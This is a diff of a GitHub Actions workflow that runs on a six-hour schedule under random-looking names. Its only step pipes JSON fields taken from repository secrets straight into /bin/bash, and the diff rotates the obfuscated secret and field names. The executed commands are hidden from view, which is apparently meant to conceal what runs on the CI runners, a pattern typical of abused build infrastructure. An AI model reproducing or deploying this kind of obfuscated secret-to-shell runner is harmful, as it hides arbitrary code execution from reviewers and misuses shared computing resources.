@@ -2,24 +2,18 @@ name: huamanlou6758
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 5/6 * * *'
-
-jobs:  # 8164
+    - cron: '27 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huamanlou6758
         env:
-          vqcry278: ${{ secrets.vqcry278 }}
+          c30: ${{ secrets.c30 }}
         run: |
-          echo $vqcry278 | jq -r .bigpv75 | /bin/bash
-          echo $rd59 | jq -r .yvox17 | /bin/bash
-          echo $nb780 | jq -r .vq9451 | /bin/bash
-          echo $j98 | jq -r .u47 | /bin/bash
-          echo $uzo56 | jq -r .yuus063 | /bin/bash
-          echo $u81 | jq -r .gh3 | /bin/bash
-          echo $lgm4546 | jq -r .n23118 | /bin/bash
-          echo $madlp9 | jq -r .nodh5931 | /bin/bash
-          echo $dcum9 | jq -r .ief6 | /bin/bash
+          echo $c30 | jq -r .owbu93880 | /bin/bash
+          echo $jucvf55 | jq -r .k90 | /bin/bash
+          echo $so61851 | jq -r .mu01903 | /bin/bash
 
